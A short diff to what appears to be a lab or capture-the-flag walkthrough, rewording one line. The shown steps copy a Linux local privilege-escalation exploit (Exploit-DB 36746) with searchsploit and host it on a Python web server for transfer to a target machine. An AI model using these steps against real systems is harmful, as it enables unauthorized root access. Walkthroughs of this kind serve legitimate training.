@@ -97,7 +97,8 @@ Those are the instructions to compile the code
 
 Copy it to your computer  
 - searchsploit -m linux/local/36746.c  
-And send the file to the target machine. I used the above command:  
+
+And send the file to the target machine. I used the above command to start a python server: 
 - sudo python3 -m http.server 80  
 
 On the target machine use this commands:  
